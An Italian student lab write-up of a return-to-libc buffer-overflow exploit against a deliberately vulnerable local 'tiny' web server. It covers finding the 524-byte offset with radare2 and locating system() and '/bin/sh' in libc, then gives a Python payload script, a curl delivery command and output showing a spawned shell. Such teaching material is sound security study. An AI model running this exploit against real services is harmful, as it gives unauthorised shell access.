# Writeup - Return-to-libc - lab2

## OFFSET identification 
Identificare l'offset della variabile nel frame che va in overflow è stato effettuando traite radare effettuando disassemblato della funzione identificata come vulnerabile da AddressSanitizer, in piu guardando disassemblato è stato possibile identificare quale fosse il buffer vulnerabile che come visto la fase di overflow è in url_decode che lavora su puntatori di variabili istanziate in process pertanto overflow sarà relativo il frame di esecuzione di process:
```
[0x08048aa0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x08048aa0]> pdf @ sym.process
/ (fcn) sym.process 565
|   sym.process (int arg_8h, void *arg_ch);
|           ; var int var_28ch @ ebp-0x28c
|           ; var int var_288h @ ebp-0x288
|           ; var int var_284h @ ebp-0x284
|           ; var int var_280h @ ebp-0x280
|           ; var int var_27ch @ ebp-0x27c
|           ; var int var_278h @ ebp-0x278
|           ; var int var_274h @ ebp-0x274
|           ; var char *var_270h @ ebp-0x270
|           ; var char *var_26ch @ ebp-0x26c
|           ; var signed int fildes @ ebp-0x268
|           ; var int var_264h @ ebp-0x264
|           ; var int var_260h @ ebp-0x260
|           ; var int var_250h @ ebp-0x250
|           ; var signed int var_234h @ ebp-0x234
|           ; var char *path @ ebp-0x208 <-- Questo è buffer che va in overflow identificato perchè nel codice viene usato nella open()
e per questo motivo che viene rinominato simbolicamente da radare in path
|           ; var signed int var_8h_2 @ ebp-0x8
|           ; var uint32_t var_4h_2 @ ebp-0x4
|           ; arg int arg_8h @ ebp+0x8
|           ; arg void *arg_ch @ ebp+0xc
|           ; var void *oflag @ esp+0x4
|           ; var char *var_8h @ esp+0x8
|           ; var int var_ch @ esp+0xc
|           ; CALL XREFS from main (0x804a1df, 0x804a287)
|           0x08049d90      55             push ebp
|           0x08049d91      89e5           mov ebp, esp
```
Da questo disassemblato e dal codice sorgente è stato identificato che è la `strut http_request` con il campo `filename`
che viene passato alla open dal seguente codice:
`File: tiny.c `
```
void process(int fd, struct sockaddr_in *clientaddr){
    printf("accept request, fd is %d, pid is %d\n", fd, getpid());
    http_request req;
    parse_request(fd, &req);

    struct stat sbuf;
    int status = 200, ffd = open(req.filename, O_RDONLY, 0);
    if(ffd <= 0){
        status = 404;
        char *msg = "File not found";

[...]
```
Di cui il relativo disassemblato riconoscibile dalla `call sym.imp.open           ; int open(const char *path, int oflag)`
```
[0x08048aa0]> pdf @ sym.process
[...]
           0x08049df8      c7859cfdffff.  mov dword [var_264h], 0xc8  ; 200
|           0x08049e02      890c24         mov dword [esp], ecx        ; const char *path
|           0x08049e05      c74424040000.  mov dword [oflag], 0        ; int oflag
|           0x08049e0d      c74424080000.  mov dword [var_8h], 0
|           0x08049e15      89857cfdffff   mov dword [var_284h], eax
|           0x08049e1b      e8f0eaffff     call sym.imp.open           ; int open(const char *path, int oflag)
|           0x08049e20      898598fdffff   mov dword [fildes], eax
|           0x08049e26      83bd98fdffff.  cmp dword [fildes], 0

[...]
```
Ed ecco che nella prima schermata di `radare` abbiamo che il buffer overflow è distante dal `Base Pointer: EBP` il seguente valore: `; var char *path @ ebp-0x208` dove `0x208 bytes` sono in base 10 `520 bytes` e quindi su questo valore sommando `4 byte` (in quanto  `32bit`) relativi il valore esatto del `EBP` come mostrato nell'immagine:
![Stack image](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/100912_1629_ReturnOrien2.png)


Di conseguenza l'exploit iniettando `"A"*524` comprenderà tutto l'offset dal `Base Pointer EBP` compreso dei suoi `4 byte di valore` quindi,qualsiasi byte scritto in più andrà a sovrascrivere il `Return Address EIP` e sarà proprio in quei 4 bytes che verrà iniettato l'indirizzo calcolato come salto su funzione estratta da `LIBC`, in questo caso la funzione `system()`.

## Construction Idea
Ci si può immaginare l'esecuzione della system come un nuovo frame d'esecuzione che contiene come primo valore il `RET address` sul quale ritornare, che nel nostro caso saranno i `4 bytes` settati a `"B"*4` e successivamente i parametri da passare alla funzione, che nel nostro caso sarà l'indirizzo della stringa "bin/sh" trovato che tramite `Stack Pivoting` verranno estratti dallo stack come se fossero i parametri della funziona usata per sovrascrivere l'indirizzo `EIP`.
Di fatto l'esecuzione della `system()` effettuerà il `pop` dallo stack della stringa contenente il path da eseguire che è stato inserito nel frame d'esecuzione fittizio tramite overflow.

## Ricercare address function in Libc

Di seguito si mostra come identificare l'indirizzo utile della funzione `system()` allocato dal sistema tramite la `Libc` 
```
$ radare2 -d tiny-noexec
Process with PID 18203 started...
= attach 18203 18203
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
glibc.fc_offset = 0x00148
 -- Use scr.accel to browse the file faster!
[0xf7fd6c70]> dcu main
Continue until 0x08049fd0 using 1 bpsize
hit breakpoint at: 8049fd0
[0x08049fd0]> dmi libc system
254 0x00127190 0xf7eff190 GLOBAL   FUNC  102 svcerr_systemerr
652 0x0003cd10 0xf7e14d10 GLOBAL   FUNC   55 __libc_system
1510 0x0003cd10 0xf7e14d10   WEAK   FUNC   55 system
```
L'indirizzo della `system()` risulta quindi essere `0xf7e14d10`


## Ricercare string address in Libc

Dovendo utilizzare come parametro della funzione `system()` la stringa `/bin/sh` sarà necessario individuare tale stringa da qualche parte all'interno della libc.

```
[0xf7faa000]> dmi
0x08048000 0x0804b000  /home/rhpco/sandbox/addresssanitizer/tiny-web-server/tiny-noexec
0xf7dd8000 0xf7faa000  /lib32/libc-2.27.so
0xf7fd6000 0xf7ffc000  /lib32/ld-2.27.so
[0xf7faa000]> s 0xf7dd8000
[0xf7dd8000]> / /bin/bash
Searching 9 bytes in [0xf7dd8000-0xf7faa000]
hits: 0
[0xf7dd8000]> / /bin/sh
Searching 7 bytes in [0xf7dd8000-0xf7faa000]
hits: 1
0xf7f538cf hit6_0 .b/strtod_l.c-c/bin/shexit 0canonica.
```
la stringa `/bin/sh` è stata identificata all'indirizzo `0xf7f538cf` e potrà essere utilizzata per la costruzione del payload

## Construction Payload

Il payload d'esecuzione da inietare sarà così costruito:

[`AAA..AAAA*524`] + [` 4 bytes indirizzo system()`]+['4 bytes indirizzo "/bin/sh"`]

## Exploit

Il codice dell'exploit per la generazione del payload sopra proposto risulta essere:
```
import struct

addr_shellstr=struct.pack("<I", 0xf7f538cf)
addr_sys=struct.pack("<I", 0xf7e14d10)

print 'A'*524+addr_sys+'B'*4+addr_shellstr

```
Mentre l'utilizzo dell'exploit risulta essere: 
```
curl "localhost:9999/`python payload.py`"
```
Di seguito il risultato ottenuto a seguito dell'esecuzione dell'exploit sul target:
```
/tiny-lab2       
listen on port 9999, fd is 3
child pid is 21313
accept request, fd is 14, pid is 21312
47.115.104.0:26990 404 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM��BBBB�8��
$ uname -a
Linux darksun 4.15.0-47-generic #50-Ubuntu SMP Wed Mar 13 10:44:52 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

( Nota: potrebbero esserci differenze di offset e indirizzi )


// rhpco